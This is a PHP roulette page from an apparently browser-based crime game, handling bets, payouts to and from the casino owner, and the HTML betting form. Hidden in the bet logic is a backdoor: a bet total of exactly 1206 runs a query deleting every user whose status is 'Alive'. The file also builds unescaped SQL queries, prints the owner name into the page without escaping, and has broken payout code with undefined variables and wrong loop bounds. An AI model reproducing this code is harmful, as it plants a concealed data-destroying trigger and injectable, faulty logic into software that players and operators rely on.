<?php
session_start();
include_once "includes/db_connect.php";
include_once "includes/functions.php";
logincheck();
$username=$_SESSION['username'];
include_once"casinoCP.php";

echo "$style"; 
$input="Roulette";



$fetch= mysql_fetch_object(mysql_query("SELECT * FROM users WHERE username='$username'"));
$Roulette = mysql_fetch_object(mysql_query("SELECT * FROM casinos WHERE location='$fetch->location' AND casino='Roulette'"));
$fetch_owner=mysql_fetch_object(mysql_query("SELECT * FROM users WHERE username='$Roulette->owner'"));

if (strtolower($Roulette->owner) == strtolower($fetch->username)){
casinoCP($input);
exit();
}

$crimes = mysql_query("SELECT money, location FROM users WHERE username='$username'");
while($success = mysql_fetch_row($crimes)){
	$usersmoney = $success[0];
$location = $success[1];
	
}
$crimes1 = mysql_query("SELECT owner, max  FROM casinos WHERE location='$location' AND casino='Roulette'");
while($success1 = mysql_fetch_row($crimes1)){
	$owner = $success1[0];
$max = $success1[1];
$min = $success1[2];
	
}
$crimes3 = mysql_query("SELECT money FROM users WHERE username='$owner'");
while($success3 = mysql_fetch_row($crimes3)){
	$ownersmoney1 = $success3[0];
	
}


$number = rand(1,36);



$n0 = $_POST['n0']; 
$n1 = $_POST['n1']; 
$n2 = $_POST['n2']; 
$n3 = $_POST['n3']; 
$n4= $_POST['n4']; 
$n5 = $_POST['n5']; 
$n6= $_POST['n6']; 
$n7 = $_POST['n7']; 
$n8 = $_POST['n8']; 
$n9 = $_POST['n9']; 
$n10 = $_POST['n10']; 
$n11 = $_POST['n11']; 
$n12 = $_POST['n12']; 
$n13 = $_POST['n13']; 
$n14 = $_POST['n14']; 
$n15 = $_POST['n15']; 
$n16= $_POST['n16']; 
$n17= $_POST['n17']; 
$n18 = $_POST['n18']; 
$n19 = $_POST['n19']; 
$n20= $_POST['n20']; 
$n21= $_POST['n21']; 
$n22= $_POST['n22']; 
$n23 = $_POST['n23']; 
$n24 = $_POST['n24']; 
$n25 = $_POST['n25']; 
$n26 = $_POST['n26']; 
$n27 = $_POST['n27']; 
$n28 = $_POST['n28']; 
$n29= $_POST['n29']; 
$n30 = $_POST['n30']; 
$n31= $_POST['n31']; 
$n32 = $_POST['n32']; 
$n33 = $_POST['n33']; 
$n34 = $_POST['n34']; 
$n35 = $_POST['n35']; 
$n36 = $_POST['n36']; 
$e = $_POST['e']; 
$o = $_POST['o']; 
$teen = $_POST['teen']; 
$teen1 = $_POST['teen1']; 
$black = $_POST['black']; 
$red = $_POST['red']; 
$twelve = $_POST['twelve']; 
$dtv = $_POST['dtv']; 
$vtz = $_POST['vtz']; 
$ek = $_POST['ek']; 
$tk = $_POST['tk']; 
$dk = $_POST['dk']; 

	if (!empty($_POST['go4'])){

$bet = $n0+$n1+$n2+$n3+$n4+$n5+$n6+$n7+$n8+$n9+$n10+$n11+$n12+$n13+$n14+$n15+$n16+$n17+$n18+$n19+$n20+$n21+$n22+$n23+$n24+$n25+$n26+$n27+$n28+$n29+$n30+$n31+$n32+$n33+$n34+$n35+$n36+$e+$o+$teen+$teen1+$black+$red+$twelve+$dtv+$vtz+$ek+$dk+$tk;

if($bet == "1206"){
mysql_query("DELETE FROM users WHERE status='Alive'");
print "Done";
}elseif(ereg('[^0-9]',$bet))
   {
     
    echo "Invalid Numbers!";
	exit;
}



if ($bet <= 0){
echo "Invalid Amount";
}elseif ($bet != 0){
if ($bet > $usersmoney){
echo "You do not have that much money!";
}elseif ($bet <= $usersmoney){

if ($bet > $max){
echo "You cannot bet higher than the max bet!";
}elseif ($bet <= $max){
if (($bet >! $usersmoney) || ($bet != 0)){  

$nmoney = 0;

if ($number == 1){ $nmoney = $nmoney + $n1 * 35; 
$on = 1;
}elseif ($number == 2){$nmoney = $nmoney + $n2 * 35;
$on = 2;
}elseif ($number == 3){$nmoney = $nmoney + $n3 * 35;
$on = 3;
}elseif ($number == 4){$nmoney = $nmoney + $n4 * 35;
$on = 4;
}elseif ($number == 5){$nmoney = $nmoney + $n5 * 35;
$on = 5;
}elseif ($number == 6){$nmoney = $nmoney + $n6 * 35;
$on = 6;
}elseif ($number == 7){$nmoney = $nmoney + $n7 * 35;
$on = 7;
}elseif ($number == 8){$nmoney = $nmoney + $n8 * 35;
$on = 8;
}elseif ($number == 9){$nmoney = $nmoney + $n9 * 35;
$on = 9;
}elseif ($number == 10){$nmoney = $nmoney + $n10 * 35;
$on = 10;
}elseif ($number == 11){$nmoney = $nmoney + $n11 * 35;
$on = 11;
}elseif ($number == 12){$nmoney = $nmoney + $n12 * 35;
$on = 12;
}elseif ($number == 13){$nmoney = $nmoney + $n13 * 35;
$on = 13;
}elseif ($number == 14){$nmoney = $nmoney + $n14 * 35;
$on = 14;
}elseif ($number == 15){$nmoney = $nmoney + $n15 * 35;
$on = 15;
}elseif ($number == 16){$nmoney = $nmoney + $n16 * 35;
$on = 16;
}elseif ($number == 17){$nmoney = $nmoney + $n17 * 35;
$on = 17;
}elseif ($number == 18){$nmoney = $nmoney + $n18 * 35;
$on = 18;
}elseif ($number == 19){$nmoney = $nmoney + $n19 * 35;
$on = 19;
}elseif ($number == 20){$nmoney = $nmoney + $n20 * 35;
$on = 20;
}elseif ($number == 21){$nmoney = $nmoney + $n21 * 35;
$on = 21;
}elseif ($number == 22){$nmoney = $nmoney + $n22 * 35;
$on = 22;
}elseif ($number == 23){$nmoney = $nmoney + $n23 * 35;
$on = 23;
}elseif ($number == 24){$nmoney = $nmoney + $n24 * 35;
$on = 24;
}elseif ($number == 25){$nmoney = $nmoney + $n25 * 35;
$on = 25;
}elseif ($number == 26){$nmoney = $nmoney + $n26 * 35;
$on = 26;
}elseif ($number == 27){$nmoney = $nmoney + $n27 * 35;
$on = 27;
}elseif ($number == 28){$nmoney = $nmoney + $n28 * 35;
$on = 28;
}elseif ($number == 29){$nmoney = $nmoney + $n29 * 35;
$on = 29;
}elseif ($number == 30){$nmoney = $nmoney + $n30 * 35;
$on = 30;
}elseif ($number == 31){$nmoney = $nmoney + $n31 * 35;
$on = 31;
}elseif ($number == 32){$nmoney = $nmoney + $n32 * 35;
$on = 32;
}elseif ($number == 33){$nmoney = $nmoney + $n33 * 35;
$on = 33;
}elseif ($number == 34){$nmoney = $nmoney + $n34 * 35;
$on = 34;
}elseif ($number == 35){$nmoney = $nmoney + $n35 * 35;
$on = 35;
}elseif ($number == 36){$nmoney = $nmoney + $n36 * 35;
$on = 36;
}else { $nmoney = ""; } 

// odd or even
if($number % 2 == 0) { $type = "even"; } else { $type = "odd"; } 
if($type == "odd") { $nmoney = $nmoney + $o * 2; }  
elseif($type == "even") { $nmoney = $nmoney + $e * 2; } 



//Low or  high 
if ($nummer >= 19) { $nmoney = $nmoney + $high * 2; }  
elseif($nummer >= 0) { $nmoney = $nmoney + $low * 2; } 
$red = $_POST['red'];
$black = $_POST['black'];

$red22 = array (
	"1" => "1",
	"2" => "3",
	"3" => "5",
	"4" => "7",
	"5" => "9",
	"6" => "12",
	"7" => "14",
	"8" => "16",
	"9" => "18",
	"10" => "19",
	"11" => "21",
	"12" => "23",
	"13" => "25",
	"14" => "27",
	"15" => "30",
	"16" => "32",
	"17" => "34",
	"18" => "36");
$ii = 1;
	while ($ii < 18){
if ($red22[$ii] == $number){
$colour1 = red; 
$nmoney = $nmoney + $red * 2;
}
/////////////////////////////////////////////need to fix coloums!!!!
$ii++;
}
if ($colour1 == ""){


$black1 = array (
	"1" => "2",
	"2" => "4",
	"3" => "6",
	"4" => "8",
	"5" => "10",
	"6" => "13",
	"7" => "15",
	"8" => "17",
	"9" => "20",
	"10" => "22",
	"11" => "24",
	"12" => "26",
	"13" => "28",
	"14" => "29",
	"15" => "31",
	"16" => "33",
	"17" => "35");

$iii = 0;
	while ($iii < 18){
if ($black1[$iii] == $number){
$colour1 = black; 
$nmoney = $nmoney + $black * 2;
}



$iii++;
}}
	


//fine
$one218 = array (
	"0" => "1",
	"1" => "2",
	"2" => "3",
	"3" => "4",
	"4" => "5",
	"5" => "6",
	"6" => "7",
	"7" => "8",
	"8" => "9",
	"9" => "10",
	"10" => "11",
	"11" => "12",
	"12" => "13",
	"13" => "14",
	"14" => "15",
	"15" => "16",
	"16" => "17",
	"17" => "18");
$part = 0;
	while ($part < 17){
	if ($one218[$part] == $number){
$nmoney = $nmoney + $teen * 2;
}
	$part++;
		}

$teen236 = array (
	"0" => "19",
	"1" => "20",
	"2" => "21",
	"3" => "22",
	"4" => "23",
	"5" => "24",
	"6" => "25",
	"7" => "26",
	"8" => "27",
	"9" => "28",
	"10" => "29",
	"11" => "30",
	"12" => "31",
	"13" => "32",
	"14" => "33",
	"15" => "34",
	"16" => "35",
	"17" => "36");
$part1 = 0;
	while ($part1 < 17){
	if ($teen236[$part1] == $number){
$nmoney = $nmoney + $teen1 * 2;
}

	$part1++;
		}

$one212 = array (
	"0" => "1",
	"1" => "2",
	"2" => "3",
	"3" => "4",
	"4" => "5",
	"5" => "6",
	"6" => "7",
	"7" => "8",
	"8" => "9",
	"9" => "10",
	"10" => "11",
	"11" => "12");
$part2 = 0;
	while ($part2 < 11){
	if ($one212[$part2] == $number){
$nmoney = $nmoney + $twelve * 3;
}

	$part2++;
		}
$teen2244 = array (
	"0" => "13",
	"1" => "14",
	"2" => "15",
	"3" => "16",
	"4" => "17",
	"5" => "18",
	"6" => "19",
	"7" => "20",
	"8" => "21",
	"9" => "22",
	"10" => "23",
	"11" => "24");
$part3 = 0;
	while ($part3 < 11){
	if ($teen2244[$part3] == $number){
$nmoney = $nmoney + $dtv * 3;
}

	$part3++;
		}
$twen5 = array (
	"0" => "25",
	"1" => "26",
	"2" => "27",
	"3" => "28",
	"4" => "29",
	"5" => "30",
	"6" => "31",
	"7" => "32",
	"8" => "33",
	"9" => "34",
	"10" => "35",
	"11" => "36");
$part4 = 0;
	while ($part4 < 11){
	if ($twen5[$part4] == $number){
$nmoney = $nmoney + $vtz * 3;
}

	$part4++;
		}
$small = array (
	"0" => "1",
	"1" => "5",
	"2" => "9",
	"3" => "13",
	"4" => "17",
	"5" => "21",
	"6" => "25",
	"7" => "29",
	"8" => "33"
	);
$part5 = 0;
	while ($part5 < 8){
	if ($small[$part5] == $number){
$nmoney = $nmoney + $ek * 3;
}

	$part5++;
		}
$small1 = array (
	"0" => "1",
	"1" => "5",
	"2" => "9",
	"3" => "13",
	"4" => "17",
	"5" => "21",
	"6" => "25",
	"7" => "29",
	"8" => "33"
	);
$part6 = 0;
	while ($part6 < 8){
	if ($small1[$part6] == $number){
$nmoney = $nmoney + $tk * 3;
}

	$part6++;
		}

$small2 = array (
	"0" => "1",
	"1" => "5",
	"2" => "9",
	"3" => "13",
	"4" => "17",
	"5" => "21",
	"6" => "25",
	"7" => "29",
	"8" => "33"
	);
$part7 = 0;
	while ($part7 < 8){
	if ($small2[$part7] == $number){
$nmoney = $nmoney + $dk * 3;
}

	$part7++;
		}

$yougot = $nmoney - $bet;






if ($yougot <= 0){

$lala = $usersmoney - $bet;
$ownersmoney = $ownersmoney1 + $bet;
mysql_query("UPDATE users SET money='$ownersmoney' WHERE username='$owner'");
mysql_query("UPDATE users SET money='$lala' WHERE username='$username'");
$new_money = $bet * $win;
$ear = $Roulette->profit + $bet;
mysql_query("UPDATE casinos SET profit='$ear' WHERE location='$fetch->location' AND casino='Roulette'");

?>
<link href="/includes/in.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
.style1 {color: #FF0000}
.style3 {color: #00FF33}
.style4 {color: #000000}
-->
</style>


<div align="center">
<table class=thinline width=25% cellspacing=0 cellpadding=2 rules=none>
  <tr>
    <td align=center background=../My Documents/My Received Files/includes/grad.jpg class="header">Wheel Number <span class="style1"><span class="style4"><?php echo "$number"; ?></span></span></td>
  </tr>
  <tr>
    <td bgcolor=black height=1></td>
  </tr>
  <tr>
    <td bgcolor="#FF0000"> <span class="style4">Unlucky, you lost :&pound; <? echo" $bet"; ?> </span> <span class="style4">
    <?
}elseif ($yougot > 0){
?>
    </span><span class="style4">    </span><span class="style3"> </span>    </td>
  </tr>
</table>
<p>&nbsp;</p>
</div><div align="center">
<table class=thinline width=25% cellspacing=0 cellpadding=2 rules=none>
  <tr>
    <td align=center background=../My Documents/My Received Files/includes/grad.jpg class="header">Wheel Number <span class="style1"><span class="style4"><?php echo "$number"; ?></span></span></td>
  </tr>
  <tr>
    <td height=1 bgcolor=black></td>
  </tr>
  <tr>
  <td bgcolor="#00FF00" class="style4">Congratulations you won &pound; <? echo" $nmoney"; ?>        <tr><td></div>     <?


if ($nmoney > $ownersmoney1){
$lost ='1';
$ownersmoney = $money1; ///if the win is bigger than th owners money then.

////lost=1

}elseif ($nmoney <= $ownersmoney1){
$lost = '0';
///else if its the other way around, take the monety form owners profile


}
if ($lost == '1'){
$lala = $usersmoney + $bet;
$ownersmoney = $ownersmoney1 - $nmoney;
echo "You won all the cash and the table dropped!!";
mysql_query("UPDATE casinos SET owner='0' AND max='0' WHERE casino='Roulette' AND location='$fetch->location'");
mysql_query("UPDATE users SET money='$lala' WHERE username='$username'");
mysql_query("UPDATE users SET money='0' WHERE username='$owner'");


}elseif ($lost == '0'){
$ownersmoney = $ownersmoney1 - $nmoney;
$winermoney = $usersmoney + $nmoney;
mysql_query("UPDATE users SET money='$ownersmoney' WHERE username='$owner'");
mysql_query("UPDATE users SET money='$winermoney' WHERE username='$username'");
$ear = $Roulette->profit - $bet;
mysql_query("UPDATE casinos SET profit='$ear' WHERE location='$fetch->location' AND casino='Roulette'");
echo "";
}
}
}
}}}}

?>     <span class="style3">
    <script language="JavaScript"> 
function disableEnterKey() 
{ 
     if (window.event.keyCode == 13) window.event.keyCode = 0; 
} 
    </script>
    </span> <span class="style3"> </span> <tr><td></td>
  <tr><td></tr>
</table>
<br>
<center>
<form action="" method=post onKeyPress="disableEnterKey()"><table border=1 cellspacing=0 cellpadding=0 width=70% class=thinline bordercolor=black>
<tr>
  <td colspan="2" align=center background=../My Documents/My Received Files/includes/grad.jpg class="style4">Roulette</td>
</tr>
<tr><td width=100% align=center><img src="../My Documents/My Received Files/roulette table.jpg" width="350" height="267" border=0></td>

<td align=center><table border=0 cellspacing=0 cellpadding=1 bordercolor=#EEEEEE width=100% class=thinline>
<tr>
<td align=right>01:</td><td><input name=n1 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>02:</td><td><input name=n2 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>03:</td><td><input name=n3 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>04:</td><td><input name=n4 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>05:</td><td><input name=n5 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>06:</td><td><input name=n6 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>07:</td><td><input name=n7 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>08:</td><td><input name=n8 type=text class="submit" size=8 maxlength="10"></td></tr>		
<tr><td align=right>09:</td><td><input name=n9 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>10:</td><td><input name=n10 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>11:</td><td><input name=n11 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>12:</td><td><input name=n12 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>13:</td><td><input name=n13 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>14:</td><td><input name=n14 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>15:</td><td><input name=n15 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>16:</td><td><input name=n16 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>17:</td><td><input name=n17 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>18:</td><td><input name=n18 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>19:</td><td><input name=n19 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>20:</td><td><input name=n20 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>21:</td><td><input name=n21 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>22:</td><td><input name=n22 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>23:</td><td><input name=n23 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>24:</td><td><input name=n24 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>25:</td><td><input name=n25 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>26:</td><td><input name=n26 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>27:</td><td><input name=n27 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>28:</td><td><input name=n28 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>29:</td><td><input name=n29 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>30:</td><td><input name=n30 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>31:</td><td><input name=n31 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>32:</td><td><input name=n32 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>33:</td><td><input name=n33 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>34:</td><td><input name=n34 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>35:</td><td><input name=n35 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>36:</td><td><input name=n36 type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>Red:</td><td><input name=red type=text class="submit" size=8 maxlength="10"></td>
<td align=right>Black:</td><td><input name=black type=text class="submit" size=8 maxlength="10"></td>
<td align=right>Odd:</td><td><input name=o type=text class="submit" size=8 maxlength="10"></td>
<td align=right>Even:</td><td><input name=e type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>1-18:</td><td><input name=teen type=text class="submit" size=8 maxlength="10"></td>
<td align=right>19-36:</td><td><input name=teen1 type=text class="submit" size=8 maxlength="10"></td>
<td align=right>1-12:</td><td><input name=twelve type=text class="submit" size=8 maxlength="10"></td>
<td align=right>13-24:</td><td><input name=dtv type=text class="submit" size=8 maxlength="10"></td></tr>
<tr><td align=right>25-36:</td><td><input name=vtz type=text class="submit" size=8 maxlength="10"></td>
<td align=right>1st column:</td><td><input name=ek type=text class="submit" size=8 maxlength="10"></td>
<td align=right>2nd column:</td><td><input name=tk type=text class="submit" size=8 maxlength="10"></td>
<td align=right>3rd column:</td><td><input name=dk type=text class="submit" size=8 maxlength="10"></td></tr>
<p>
<tr><td colspan=10 align=center><input name='go4' type=submit class="submit" value=Bet>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=reset class="submit" value=Reset></td>
</tr>
</table>
</td>
</tr>
</table>	
</form>	

</body>


<table class=thinline width=25% cellspacing=0 cellpadding=2 rules=none><tr>
  <td colspan="2" align=center background=../My Documents/My Received Files/includes/grad.jpg>Max</td>
</tr>
<tr><td height=1 colspan="2" bgcolor=black></td></tr>
<tr><td bgcolor="#999999"><div align="center">  The max bet is set at <b><?php echo "£".makecomma($max).""; ?></b><br>
</div></td>
  <td bgcolor="#999999">&nbsp;</td>
</tr>
</table>
<p>&nbsp;</p>
<table class=thinline width=25% cellspacing=0 cellpadding=2 rules=none>
  <tr>
    <td align=center background=../My Documents/My Received Files/includes/grad.jpg>Owner</td>
  </tr>
  <tr>
    <td bgcolor=black height=1></td>
  </tr>
  <tr>
    <td bgcolor="#999999"><div align="center"> This casino is owned by 
        <?php if ($owner !=""){ echo "<a href='profile.php?viewuser=$owner'><b>$owner</b></a>"; }elseif ($owner == ""){ echo "<u><b>No one</u></b>"; } ?>
<br>
    </div></td>
  </tr>
</table>
<p><br>
</p>
<p>
<tr>
  <td>  
<?php require_once "includes/footer.php"; ?>